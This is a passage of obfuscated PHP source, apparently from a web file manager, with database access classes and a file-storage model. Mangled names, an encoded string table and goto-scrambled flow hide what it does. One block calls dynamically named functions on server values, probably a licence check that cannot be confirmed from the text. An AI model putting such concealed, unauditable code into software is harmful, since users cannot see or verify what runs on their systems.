PHP_EOL, $¬Ñ¥­—) . $¼©º†Úà[74]; if ($µ¶ë® && $µ¶ë® == $¼©º†Úà[13]) { return $¬Ñ¥­—; } $ÌĞŒÆ¨å = array(); $ã¯Ü Ú¿ = array($¼©º†Úà[1212] => $¼©º†Úà[1225], $¼©º†Úà[391] => $¼©º†Úà[1226]); $Í˜§„© = $¼©º†Úà[12]; foreach ($–“è‰Ô as $¾İã„ûÖ) { if ($¾İã„ûÖ[$¼©º†Úà[57]] == $¼©º†Úà[91]) { $Í˜§„© = $¾İã„ûÖ[$¼©º†Úà[32]]; } $ÙÅ¤Ê®† = array($¼©º†Úà[461] . $¾İã„ûÖ[$¼©º†Úà[32]] . $¼©º†Úà[461], isset($ã¯Ü Ú¿[$¾İã„ûÖ[$¼©º†Úà[33]]]) ? $ã¯Ü Ú¿[$¾İã„ûÖ[$¼©º†Úà[33]]] : $¾İã„ûÖ[$¼©º†Úà[33]], $¾İã„ûÖ[$¼©º†Úà[35]] == $¼©º†Úà[91] ? $¼©º†Úà[1217] : $¼©º†Úà[1227] . $¾İã„ûÖ[$¼©º†Úà[56]], $¾İã„ûÖ[$¼©º†Úà[57]] == $¼©º†Úà[91] ? $¼©º†Úà[1228] : $¼©º†Úà[12]); $ÌĞŒÆ¨å[] = trim(implode($¼©º†Úà[53], $ÙÅ¤Ê®†)); } foreach ($íòš†ùı as $ûõ†ëª => $ŒªŸ…¶·) { $á”±üÃ = str_replace($¼©º†Úà[1229] . $„Õ¯Ş½ø . $¼©º†Úà[11], $¼©º†Úà[12], $ûõ†ëª); $Ù¯Éşº€ = str_replace(array($¼©º†Úà[121], $¼©º†Úà[1046]), $¼©º†Úà[461], substr($ŒªŸ…¶·, stripos($ŒªŸ…¶·, $¼©º†Úà[337]))); if ($á”±üÃ == $¼©º†Úà[1206]) { $ÉÄì¾º = $¼©º†Úà[1230] . $Í˜§„© . $¼©º†Úà[1231]; } else { $ÉÄì¾º = (stripos($á”±üÃ, $¼©º†Úà[11]) ? $¼©º†Úà[1232] : $¼©º†Úà[12]) . ($¼©º†Úà[1233] . $á”±üÃ . $¼©º†Úà[1234] . $Ù¯Éşº€); } $ÌĞŒÆ¨å[] = $ÉÄì¾º; } $¹ñ±ËÙş = array($¼©º†Úà[1235] . $„Õ¯Ş½ø . $¼©º†Úà[1236], $¼©º†Úà[1237] . $„Õ¯Ş½ø . $¼©º†Úà[1238], implode($¼©º†Úà[50] . PHP_EOL, $ÌĞŒÆ¨å), $¼©º†Úà[1239]); $áŠèì = implode(PHP_EOL, $¹ñ±ËÙş); if ($µ¶ë® && $µ¶ë® == $¼©º†Úà[887]) { return $áŠèì; } $‰õµÇ¾„ = array($¼©º†Úà[887] => $áŠèì, $¼©º†Úà[13] => $¬Ñ¥­—); return $µ¶ë® ? $‰õµÇ¾„[$µ¶ë®] : $‰õµÇ¾„; } } goto bàÌ°¤ôˆÒ; b˜§«Ëéİ‚: define($_SERVER[Ùæõ‰Ï’][0], $_SERVER[Ùæõ‰Ï’][1]); $_SERVER[™ÊæÄ‡Ş] = explode($_SERVER[Ùæõ‰Ï’][2], gzinflate(substr($_SERVER[Ùæõ‰Ï’][3], 10, -8))); function binCheckEq($•©şêÜõ, $ª°½Ñ·) { return $•©şêÜõ == $ª°½Ñ·; } goto EëÀè¦Ë‘·; FôÍƒ´ß”È: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($®€Ìğ½ş = '') { $¿„ÎÌø =& $_SERVER[Ùæõ‰Ï’]; if (!class_exists($¿„ÎÌø[1003])) { think_exception(think_lang($¿„ÎÌø[14]) . $¿„ÎÌø[1004]); } if (!empty($®€Ìğ½ş)) { $this->config = $®€Ìğ½ş; if (empty($this->config[$¿„ÎÌø[17]])) { $this->config[$¿„ÎÌø[17]] = array(); } } } public function connect($·Š›¨ĞË = '', $Áìúíçç = 0) { $Íé…¢¸Ì =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->linkID[$Áìúíçç])) { if (empty($·Š›¨ĞË)) { $·Š›¨ĞË = $this->config; } $¶÷éí¯Ğ = !empty($·Š›¨ĞË[$Íé…¢¸Ì[17]][$Íé…¢¸Ì[18]]) ? $·Š›¨ĞË[$Íé…¢¸Ì[17]][$Íé…¢¸Ì[18]] : $this->pconnect; if ($¶÷éí¯Ğ) { $·Š›¨ĞË[$Íé…¢¸Ì[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Áìúíçç] = new PDO($·Š›¨ĞË[$Íé…¢¸Ì[1005]], $·Š›¨ĞË[$Íé…¢¸Ì[977]], $·Š›¨ĞË[$Íé…¢¸Ì[978]], $·Š›¨ĞË[$Íé…¢¸Ì[17]]); } catch (PDOException $—¾ÚÊô—) { think_exception($—¾ÚÊô—->getMessage()); } $this->dbType = $this->_getDsnType($·Š›¨ĞË[$Íé…¢¸Ì[1005]]); if (in_array($this->dbType, array($Íé…¢¸Ì[1006], $Íé…¢¸Ì[1007], $Íé…¢¸Ì[1008], $Íé…¢¸Ì[1009]))) { think_exception($Íé…¢¸Ì[1010] . $this->dbType . $Íé…¢¸Ì[1011] . $this->dbType . $Íé…¢¸Ì[1012]); } if (!$this->linkID[$Áìúíçç]) { think_exception($Íé…¢¸Ì[1013]); } try { $this->linkID[$Áìúíçç]->exec($Íé…¢¸Ì[1014] . think_config($Íé…¢¸Ì[980])); } catch (Exception $—¾ÚÊô—) { } $this->connected = !0; if (1 != think_config($Íé…¢¸Ì[22])) { unset($this->config); } } return $this->linkID[$Áìúíçç]; } public function free() { $this->PDOStatement = null; } public function query($§”ş¿ğµ, $¼êÇÆÎ³ = array()) { $Á‹ÍÊ–› =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $§”ş¿ğµ; if (!empty($¼êÇÆÎ³)) { $this->queryStr .= $Á‹ÍÊ–›[1015] . print_r($¼êÇÆÎ³, !0) . $Á‹ÍÊ–›[1016]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Á‹ÍÊ–›[23], 1); think_status($Á‹ÍÊ–›[24]); $this->PDOStatement = $this->_linkID->prepare($§”ş¿ğµ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $åîî¥úØ = $this->PDOStatement->execute($¼êÇÆÎ³); $this->debug(); if (!1 === $åîî¥úØ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ñ®¬ÔİÀ, $ŠÉ¶ã—À = array()) { $£¶ëøÆ“ =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ñ®¬ÔİÀ; if (!empty($ŠÉ¶ã—À)) { $this->queryStr .= $£¶ëøÆ“[1015] . print_r($ŠÉ¶ã—À, !0) . $£¶ëøÆ“[1016]; } $»Ô†¸ëò = !1; if ($this->dbType == $£¶ëøÆ“[1009]) { if (preg_match($£¶ëøÆ“[1017], $this->queryStr, $´…§Îï‘)) { $this->table = think_config($£¶ëøÆ“[1018]) . str_ireplace(think_config($£¶ëøÆ“[1019]), $£¶ëøÆ“[454], $´…§Îï‘[2]); $»Ô†¸ëò = (bool) $this->query($£¶ëøÆ“[1020] . strtoupper($this->table) . $£¶ëøÆ“[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($£¶ëøÆ“[25], 1); think_status($£¶ëøÆ“[24]); $this->PDOStatement = $this->_linkID->prepare($Ñ®¬ÔİÀ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ÿ‡¾ ©ş = $this->PDOStatement->execute($ŠÉ¶ã—À); $this->debug(); if (!1 === $Ÿ‡¾ ©ş) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($»Ô†¸ëò || preg_match($£¶ëøÆ“[1021], $Ñ®¬ÔİÀ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Í‚ª”Õ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Í‚ª”Õ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ë±Ùúõ™ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ë±Ùúõ™) { $this->error(); return !1; } } return !0; } private function getAll() { $£Çš×ìæ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($£Çš×ìæ); return $£Çš×ìæ; } public function getFields($ãÜéÚµ) { $Áàş—Ë˜ =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!0); if (think_config($Áàş—Ë˜[1022])) { $Ç×ï¾’Ğ = str_replace($Áàş—Ë˜[1023], $ãÜéÚµ, think_config($Áàş—Ë˜[1022])); } else { switch ($this->dbType) { case $Áàş—Ë˜[1006]: case $Áàş—Ë˜[1024]: $Ç×ï¾’Ğ = "\x53\x45\x4c\x45\x43\124\x20\40\x20\143\x6f\x6c\165\x6d\x6e\137\156\x61\155\x65\x20\x61\x73\40\47\116\141\x6d\x65\x27\x2c\40\40\x20\144\x61\x74\141\x5f\x74\171\160\x65\x20\141\163\x20\47\x54\x79\x70\145\47\54\x20\x20\x20\143\157\154\x75\155\156\x5f\x64\145\146\141\x75\154\x74\40\x61\163\x20\x27\x44\145\x66\x61\x75\x6c\164\x27\54\x20\40\x20\x69\x73\x5f\x6e\x75\x6c\x6c\141\142\154\x65\x20\x61\x73\x20\47\x4e\165\x6c\x6c\47\12\11\11\106\122\x4f\x4d\11\x69\156\146\x6f\x72\x6d\x61\x74\x69\157\156\137\x73\x63\150\145\155\x61\56\164\x61\142\x6c\x65\x73\40\x41\123\x20\164\12\11\11\x4a\x4f\x49\116\11\x69\x6e\146\157\162\155\x61\x74\x69\157\x6e\137\163\143\150\145\x6d\141\x2e\143\x6f\154\x75\155\156\x73\x20\101\123\x20\143\12\11\x9\x4f\116\x20\x20\x74\x2e\164\141\x62\x6c\145\x5f\143\x61\164\x61\154\157\147\x20\75\x20\143\x2e\164\x61\x62\154\x65\137\x63\141\164\x61\x6c\157\x67\xa\11\11\x41\116\x44\40\x74\x2e\x74\x61\142\x6c\x65\137\x73\143\150\145\x6d\x61\x20\75\40\x63\x2e\x74\x61\x62\x6c\145\137\163\143\150\x65\155\x61\xa\11\11\101\x4e\104\x20\x74\56\164\141\x62\154\x65\x5f\156\x61\155\x65\40\75\x20\x63\56\x74\x61\142\154\x65\x5f\x6e\141\x6d\x65\12\x9\11\x57\110\105\122\105\40\x20\40\x74\x2e\x74\x61\142\154\145\137\156\x61\155\145\x20\75\x20\x27{$ãÜéÚµ}\47"; break; case $Áàş—Ë˜[1025]: $Ç×ï¾’Ğ = $Áàş—Ë˜[1026] . $ãÜéÚµ . $Áàş—Ë˜[1027]; break; case $Áàş—Ë˜[1007]: case $Áàş—Ë˜[1009]: $Ç×ï¾’Ğ = $Áàş—Ë˜[1028] . $Áàş—Ë˜[1029] . $Áàş—Ë˜[1030] . strtoupper($ãÜéÚµ) . $Áàş—Ë˜[1031] . strtoupper($ãÜéÚµ) . $Áàş—Ë˜[1032]; break; case $Áàş—Ë˜[1033]: $Ç×ï¾’Ğ = $Áàş—Ë˜[1034] . $ãÜéÚµ . $Áàş—Ë˜[1035]; break; case $Áàş—Ë˜[1008]: break; case $Áàş—Ë˜[1036]: default: $Ç×ï¾’Ğ = $Áàş—Ë˜[1037] . ($this->dbType == $Áàş—Ë˜[1036] ? "\140{$ãÜéÚµ}\140" : $ãÜéÚµ); } } $Ûëú€Áï = $this->query($Ç×ï¾’Ğ); $€ ¯àÔ = array(); if ($Ûëú€Áï) { foreach ($Ûëú€Áï as $øÆîí¾ä => $¨ï‰âŒÊ) { $¨ï‰âŒÊ = array_change_key_case($¨ï‰âŒÊ); $¨ï‰âŒÊ[$Áàş—Ë˜[32]] = isset($¨ï‰âŒÊ[$Áàş—Ë˜[32]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[32]] : $Áàş—Ë˜[454]; $¨ï‰âŒÊ[$Áàş—Ë˜[33]] = isset($¨ï‰âŒÊ[$Áàş—Ë˜[33]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[33]] : $Áàş—Ë˜[454]; $»°åÊÈİ = isset($¨ï‰âŒÊ[$Áàş—Ë˜[350]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[350]] : $¨ï‰âŒÊ[$Áàş—Ë˜[32]]; $€ ¯àÔ[$»°åÊÈİ] = array($Áàş—Ë˜[32] => $»°åÊÈİ, $Áàş—Ë˜[33] => $¨ï‰âŒÊ[$Áàş—Ë˜[33]], $Áàş—Ë˜[35] => (bool) (isset($¨ï‰âŒÊ[$Áàş—Ë˜[106]]) && $¨ï‰âŒÊ[$Áàş—Ë˜[106]] === $Áàş—Ë˜[12] || isset($¨ï‰âŒÊ[$Áàş—Ë˜[35]]) && $¨ï‰âŒÊ[$Áàş—Ë˜[35]] === $Áàş—Ë˜[12]), $Áàş—Ë˜[37] => isset($¨ï‰âŒÊ[$Áàş—Ë˜[37]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[37]] : (isset($¨ï‰âŒÊ[$Áàş—Ë˜[56]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[56]] : $Áàş—Ë˜[454]), $Áàş—Ë˜[39] => isset($¨ï‰âŒÊ[$Áàş—Ë˜[97]]) ? strtolower($¨ï‰âŒÊ[$Áàş—Ë˜[97]]) == $Áàş—Ë˜[41] : (isset($¨ï‰âŒÊ[$Áàş—Ë˜[57]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[57]] : !1), $Áàş—Ë˜[42] => isset($¨ï‰âŒÊ[$Áàş—Ë˜[1038]]) ? strtolower($¨ï‰âŒÊ[$Áàş—Ë˜[1038]]) == $Áàş—Ë˜[44] : (isset($¨ï‰âŒÊ[$Áàş—Ë˜[97]]) ? $¨ï‰âŒÊ[$Áàş—Ë˜[97]] : !1)); } } return $€ ¯àÔ; } public function getTables($šïóÕÂ¦ = '') { $Ö‹àöÓŸ =& $_SERVER[Ùæõ‰Ï’]; if (think_config($Ö‹àöÓŸ[1039])) { $áÇÈ ìß = str_replace($Ö‹àöÓŸ[1040], $šïóÕÂ¦, think_config($Ö‹àöÓŸ[1039])); } else { switch ($this->dbType) { case $Ö‹àöÓŸ[1007]: case $Ö‹àöÓŸ[1009]: $áÇÈ ìß = $Ö‹àöÓŸ[1041]; break; case $Ö‹àöÓŸ[1006]: case $Ö‹àöÓŸ[1024]: $áÇÈ ìß = $Ö‹àöÓŸ[1042]; break; case $Ö‹àöÓŸ[1033]: $áÇÈ ìß = $Ö‹àöÓŸ[1043]; break; case $Ö‹àöÓŸ[1008]: think_exception(think_lang($Ö‹àöÓŸ[1044]) . $Ö‹àöÓŸ[1045]); break; case $Ö‹àöÓŸ[1025]: $áÇÈ ìß = $Ö‹àöÓŸ[45] . $Ö‹àöÓŸ[46] . $Ö‹àöÓŸ[47]; break; case $Ö‹àöÓŸ[1036]: default: if (!empty($šïóÕÂ¦)) { $áÇÈ ìß = $Ö‹àöÓŸ[988] . $šïóÕÂ¦ . $Ö‹àöÓŸ[989]; } else { $áÇÈ ìß = $Ö‹àöÓŸ[990]; } } } $ãáµçù = $this->query($áÇÈ ìß); $©ëÑâÚ = array(); foreach ($ãáµçù as $ĞôÎ½…Ö => $šİ‘äŒ’) { $©ëÑâÚ[$ĞôÎ½…Ö] = current($šİ‘äŒ’); } return $©ëÑâÚ; } protected function parseLimit($¸ğåÃ–) { $î¶¾£‡ê =& $_SERVER[Ùæõ‰Ï’]; $Áœù–Ä = $î¶¾£‡ê[12]; if (!empty($¸ğåÃ–)) { switch ($this->dbType) { case $î¶¾£‡ê[1033]: case $î¶¾£‡ê[1025]: $¸ğåÃ– = explode($î¶¾£‡ê[50], $¸ğåÃ–); if (count($¸ğåÃ–) > 1) { $Áœù–Ä .= $î¶¾£‡ê[51] . $¸ğåÃ–[1] . $î¶¾£‡ê[52] . $¸ğåÃ–[0] . $î¶¾£‡ê[53]; } else { $Áœù–Ä .= $î¶¾£‡ê[51] . $¸ğåÃ–[0] . $î¶¾£‡ê[53]; } break; case $î¶¾£‡ê[1006]: case $î¶¾£‡ê[1024]: break; case $î¶¾£‡ê[1008]: break; case $î¶¾£‡ê[1007]: case $î¶¾£‡ê[1009]: break; case $î¶¾£‡ê[1036]: default: $Áœù–Ä .= $î¶¾£‡ê[51] . $¸ğåÃ– . $î¶¾£‡ê[53]; } } return $Áœù–Ä; } public function parseKey(&$Ùİ‹Ø¤‘, $ìù®ÇÔµ = true) { $šóÅªûª =& $_SERVER[Ùæõ‰Ï’]; if ($ìù®ÇÔµ) { $Ùİ‹Ø¤‘ = $this->parseKeyCheck($Ùİ‹Ø¤‘); } if ($this->dbType == $šóÅªûª[1036]) { if ($Ùİ‹Ø¤‘ != $šóÅªûª[220] && !preg_match($šóÅªûª[1000], $Ùİ‹Ø¤‘)) { $Ùİ‹Ø¤‘ = $šóÅªûª[461] . trim($Ùİ‹Ø¤‘, $šóÅªûª[461]) . $šóÅªûª[461]; } return $Ùİ‹Ø¤‘; } else { return parent::parseKey($Ùİ‹Ø¤‘, $ìù®ÇÔµ); } } public function close() { $this->_linkID = null; } public function error() { $ÉÙÔ„é =& $_SERVER[Ùæõ‰Ï’]; if ($this->PDOStatement) { $ÑØ¸ê†Æ = $this->PDOStatement->errorInfo(); $this->error = $ÑØ¸ê†Æ[1] . $ÉÙÔ„é[4] . $ÑØ¸ê†Æ[2]; } else { $this->error = $ÉÙÔ„é[12]; } if ($ÉÙÔ„é[12] != $this->queryStr) { $this->error .= LNG($ÉÙÔ„é[48]) . $this->queryStr; } think_trace($this->error, $ÉÙÔ„é[12], $ÉÙÔ„é[49]); return $this->error; } public function escapeString($îâ«üçî) { $§ıè»‡ =& $_SERVER[Ùæõ‰Ï’]; switch ($this->dbType) { case $§ıè»‡[1033]: case $§ıè»‡[1006]: case $§ıè»‡[1024]: case $§ıè»‡[1036]: return addslashes($îâ«üçî); case $§ıè»‡[1008]: case $§ıè»‡[1025]: case $§ıè»‡[1007]: case $§ıè»‡[1009]: return str_ireplace($§ıè»‡[58], $§ıè»‡[59], $îâ«üçî); } } protected function parseValue($…ÇèÙ¦â) { $¤¹¤ÖÆ =& $_SERVER[Ùæõ‰Ï’]; if (is_string($…ÇèÙ¦â)) { $°ó°õ„– = strpos($…ÇèÙ¦â, $¤¹¤ÖÆ[4]) === 0 && in_array($…ÇèÙ¦â, array_keys($this->bind)); $…ÇèÙ¦â = $°ó°õ„– ? $this->escapeString($…ÇèÙ¦â) : $¤¹¤ÖÆ[1046] . $this->escapeString($…ÇèÙ¦â) . $¤¹¤ÖÆ[1046]; } elseif (isset($…ÇèÙ¦â[0]) && is_string($…ÇèÙ¦â[0]) && strtolower($…ÇèÙ¦â[0]) == $¤¹¤ÖÆ[373]) { $…ÇèÙ¦â = $this->escapeString($…ÇèÙ¦â[1]); } elseif (is_array($…ÇèÙ¦â)) { $…ÇèÙ¦â = array_map(array($this, $¤¹¤ÖÆ[1047]), $…ÇèÙ¦â); } elseif (is_bool($…ÇèÙ¦â)) { $…ÇèÙ¦â = $…ÇèÙ¦â ? $¤¹¤ÖÆ[91] : $¤¹¤ÖÆ[228]; } elseif (is_null($…ÇèÙ¦â)) { $…ÇèÙ¦â = $¤¹¤ÖÆ[106]; } return $…ÇèÙ¦â; } public function getLastInsertId() { $ºúŞøö =& $_SERVER[Ùæõ‰Ï’]; switch ($this->dbType) { case $ºúŞøö[1033]: case $ºúŞøö[1025]: case $ºúŞøö[1006]: case $ºúŞøö[1024]: case $ºúŞøö[1008]: case $ºúŞøö[1036]: return $this->_linkID->lastInsertId(); case $ºúŞøö[1007]: case $ºúŞøö[1009]: $÷¨×¡Ëä = $this->table; $Ò¾®Ÿù = $this->query("\x53\105\x4c\105\x43\124\x20{$÷¨×¡Ëä}\x2e\x63\165\162\x72\x76\x61\154\x20\143\x75\162\162\166\x61\154\40\x46\x52\117\115\40\x64\165\141\x6c"); return $Ò¾®Ÿù ? $Ò¾®Ÿù[0][$ºúŞøö[1048]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ °·¢Õç) { $Ì›÷ôï¿ =& $_SERVER[Ùæõ‰Ï’]; if (!CacheLock::fileLock($Ì›÷ôï¿[13])) { return !1; } $˜Ë·ŞÆÃ = parent::query($ °·¢Õç); CacheLock::fileUnLock($Ì›÷ôï¿[13]); return $˜Ë·ŞÆÃ; } public function execute($½›çÙ‚³) { $¨Á¼±‡ =& $_SERVER[Ùæõ‰Ï’]; if (!CacheLock::fileLock($¨Á¼±‡[13])) { return !1; } $Àìê¹şÀ = parent::execute($½›çÙ‚³); CacheLock::fileUnLock($¨Á¼±‡[13]); return $Àìê¹şÀ; } } if ($_SERVER[$_SERVER[Ùæõ‰Ï’][961]] != $_SERVER[$_SERVER[Ùæõ‰Ï’][1049]]) { $_getc = $_SERVER[Ùæõ‰Ï’][963]; $_getfile = $_SERVER[$_SERVER[Ùæõ‰Ï’][964]] . $_SERVER[Ùæõ‰Ï’][965]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ùæõ‰Ï’][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ùæõ‰Ï’][686]) { $exit = $_SERVER[Ùæõ‰Ï’][966]; $exit(); } $_act = $_SERVER[Ùæõ‰Ï’][1050]; $_act($_SERVER[$_SERVER[Ùæõ‰Ï’][959]]); } goto FğÕÔ‹ë„š; bÊŞ©×»ôª: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\154\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\155\x65" => "\x69\157\x5f\x66\151\154\145\137\155\145\164\141", "\155\145\164\x61\106\151\145\154\x64" => "\146\151\x6c\x65\x49\104"); public function fileInfo($ô®ğì) { $–Ø¡Ş— =& $_SERVER[Ùæõ‰Ï’]; static $îä°ôÃ¯ = array(); if (!isset($îä°ôÃ¯[$ô®ğì])) { $½——±Áû = $–Ø¡Ş—[2029]; $ÒÏİİÁŒ = Model($–Ø¡Ş—[544])->field($½——±Áû)->where(array($–Ø¡Ş—[542] => $ô®ğì))->find(); $îä°ôÃ¯[$ô®ğì] = $ÒÏİİÁŒ; } return $îä°ôÃ¯[$ô®ğì]; } public function addFileByContent($™ºË£¡ = '', $¼Éš‚ï’ = '') { $¦ê÷ÑİŸ =& $_SERVER[Ùæõ‰Ï’]; $¢—±İª = TEMP_PATH . $¦ê÷ÑİŸ[2030]; if (!is_dir($¢—±İª)) { mk_dir($¢—±İª); } $¥ğÇ·¿ƒ = $¢—±İª . $¦ê÷ÑİŸ[2031] . rand_string(16); file_put_contents($¥ğÇ·¿ƒ, $™ºË£¡); $ÜªÑ¿È = $this->addFile($¥ğÇ·¿ƒ, $¼Éš‚ï’, !0); if (file_exists($¥ğÇ·¿ƒ)) { @unlink($¥ğÇ·¿ƒ); } return $ÜªÑ¿È; } public function createFileName($¼†Õªéè, $ÁáÜ‹¤ = false, $°èòÙ®ô = false) { $Õãìó½ =& $_SERVER[Ùæõ‰Ï’]; $›¬Ù¤Ï‹ = IO::init($Õãìó½[8]); $š¤¢µÒŠ = $this->makeFilePath($¼†Õªéè, $›¬Ù¤Ï‹, $ÁáÜ‹¤, $°èòÙ®ô); $şú«³¾Ô = $›¬Ù¤Ï‹->pathFather($š¤¢µÒŠ); static $£Œ§œ£É = false; $¸²ÎÁ‡ = $Õãìó½[2032] . md5($şú«³¾Ô); if (!$£Œ§œ£É && !Cache::get($¸²ÎÁ‡)) { $£Œ§œ£É = !0; $Äû¼“íÅ = IO::mkdir($şú«³¾Ô); if (!IO::exist($Äû¼“íÅ . $Õãìó½[880])) { IO::mkfile($Äû¼“íÅ . $Õãìó½[880]); } Cache::set($¸²ÎÁ‡, 1, 3600 * 2); } return $š¤¢µÒŠ; } public function makeFilePath($ÎÊÅ§ï», $’ËÄÍš¬, $õéË£“À = false, $”øã—¢ƒ = false) { $û¡ô«Ï =& $_SERVER[Ùæõ‰Ï’]; $Êğ÷Œ¡ = Model($û¡ô«Ï[853])->get($û¡ô«Ï[2033]); $Áøßî»– = KodIO::defaultIO() . date($û¡ô«Ï[2034]); $¿ïƒÈù³ = $Áøßî»– . rand_string(5) . short_id(100); $ÎÊÅ§ï» = str_replace($û¡ô«Ï[8], $û¡ô«Ï[11], KodIO::clear($ÎÊÅ§ï»)); $ƒ€Ìùó‚ = $’ËÄÍš¬->ext($ÎÊÅ§ï»); if (!$ÎÊÅ§ï») { $Êğ÷Œ¡ = $û¡ô«Ï[859]; } switch ($Êğ÷Œ¡) { case $û¡ô«Ï[2035]: if ($ƒ€Ìùó‚) { $¿ïƒÈù³ = $¿ïƒÈù³ . $û¡ô«Ï[10] . $ƒ€Ìùó‚; } if ($ƒ€Ìùó‚ == $û¡ô«Ï[1972]) { $¿ïƒÈù³ .= $û¡ô«Ï[1304]; } break; case $û¡ô«Ï[2036]: $ÂõîÆò· = Model($û¡ô«Ï[853])->get($û¡ô«Ï[854]); $Ò¨ºÊ’¤ = substr(md5($û¡ô«Ï[855] . $ÂõîÆò· . date($û¡ô«Ï[832])), 0, 8); $–ÏÔ˜¯Ñ = KodIO::defaultDriver(); $Áøßî»– = $û¡ô«Ï[1335] . $–ÏÔ˜¯Ñ[$û¡ô«Ï[475]] . $û¡ô«Ï[484] . date($û¡ô«Ï[2037]) . $Ò¨ºÊ’¤ . $û¡ô«Ï[8]; if ($ƒ€Ìùó‚ == $û¡ô«Ï[1972]) { $ÎÊÅ§ï» .= $û¡ô«Ï[1304]; } $ÖÜ´Ó = $û¡ô«Ï[2038] . $Áøßî»– . $ÎÊÅ§ï»; CacheLock::lock($ÖÜ´Ó); $¿ïƒÈù³ = $Áøßî»– . $ÎÊÅ§ï»; if (IO::exist($Áøßî»– . $ÎÊÅ§ï»)) { $Åé¢‘‡¦ = substr($ÎÊÅ§ï», 0, strlen($ÎÊÅ§ï») - strlen($ƒ€Ìùó‚)); $ ÕÉ³æ½ = $”øã—¢ƒ ? substr($”øã—¢ƒ, 0, 5) : ($õéË£“À ? substr($õéË£“À, 0, 5) : rand_string(5)); $¿ïƒÈù³ = $Áøßî»– . $Åé¢‘‡¦ . $ ÕÉ³æ½; if ($ƒ€Ìùó‚) { $¿ïƒÈù³ = $¿ïƒÈù³ . $û¡ô«Ï[10] . $ƒ€Ìùó‚; } } if (IO::isOsDriver($¿ïƒÈù³) && !IO::isUploadServer($¿ïƒÈù³)) { if (IO::exist($¿ïƒÈù³)) { return $¿ïƒÈù³; } $êºôôÕæ = IO::setContent($¿ïƒÈù³, $û¡ô«Ï[12]); if (!$êºôôÕæ) { show_json($û¡ô«Ï[2039], !1); } } CacheLock::unlock($ÖÜ´Ó); break; case $û¡ô«Ï[859]: break; default: break; } return $¿ïƒÈù³; } public function addFileByRemote($Ûì¿Á’÷, $‡¯‹ç¤Ÿ, $øºŸÓË = array()) { $¶‚®Ñ÷  =& $_SERVER[Ùæõ‰Ï’]; if (!IO::exist($Ûì¿Á’÷)) { return !1; } $´Í¿Á›ß = $øºŸÓË[$¶‚®Ñ÷ [547]] ? $øºŸÓË[$¶‚®Ñ÷ [547]] : $¶‚®Ñ÷ [12]; $§‡­‚¡Ñ = IO::hashMd5($Ûì¿Á’÷, $´Í¿Á›ß); $ˆÚÍë‹ = KodIO::defaultDriver(); $ì’÷çŸè = array($¶‚®Ñ÷ [617] => IO::size($Ûì¿Á’÷), $¶‚®Ñ÷ [2040] => 1, $¶‚®Ñ÷ [494] => $‡¯‹ç¤Ÿ, $¶‚®Ñ÷ [891] => $ˆÚÍë‹[$¶‚®Ñ÷ [475]], $¶‚®Ñ÷ [495] => $Ûì¿Á’÷, $¶‚®Ñ÷ [2041] => $øºŸÓË[$¶‚®Ñ÷ [672]] ? $øºŸÓË[$¶‚®Ñ÷ [672]] : IO::hashSimple($Ûì¿Á’÷), $¶‚®Ñ÷ [2042] => $§‡­‚¡Ñ ? $§‡­‚¡Ñ : $´Í¿Á›ß); if ($óµ´®íÖ = $this->addFileCheckExist($ì’÷çŸè[$¶‚®Ñ÷ [672]], $ì’÷çŸè[$¶‚®Ñ÷ [547]], $ì’÷çŸè[$¶‚®Ñ÷ [79]])) { return $óµ´®íÖ; } return $this->addFileData($ì’÷çŸè); } private function addFileData($ßûŒÂ¼³) { $ÇŞ‘™‘° =& $_SERVER[Ùæõ‰Ï’]; if (!$ßûŒÂ¼³) { return !1; } $ßûŒÂ¼³[$ÇŞ‘™‘°[79]] = intval($ßûŒÂ¼³[$ÇŞ‘™‘°[79]]); if (!$ßûŒÂ¼³[$ÇŞ‘™‘°[79]] && strlen($ßûŒÂ¼³[$ÇŞ‘™‘°[672]]) > 32) { $ßûŒÂ¼³[$ÇŞ‘™‘°[79]] = intval(substr($ßûŒÂ¼³[$ÇŞ‘™‘°[672]], 32)); } $¦ÔûÕº× = $this->add($ßûŒÂ¼³); return $this->find($¦ÔûÕº×); } public function addFile($¬èĞ…Ÿù, $Ç¡öÎ, $ÔÌœø¯¨ = false) { $ŞŠ†´½‚ =& $_SERVER[Ùæõ‰Ï’]; $›®¿¸®° = IO::hashSimple($¬èĞ…Ÿù); $·é¹´À· = IO::size($¬èĞ…Ÿù); $İ›è÷…Ô = $·é¹´À· <= 1024 * 1024 * 10 ? IO::hashMd5($¬èĞ…Ÿù) : $ŞŠ†´½‚[12]; $”Š˜Ø = $ŞŠ†´½‚[2043] . $›®¿¸®°; CacheLock::lock($”Š˜Ø); if ($İ›è÷…Ô && $›®¿¸®°) { $ÎÖêÆê‚ = 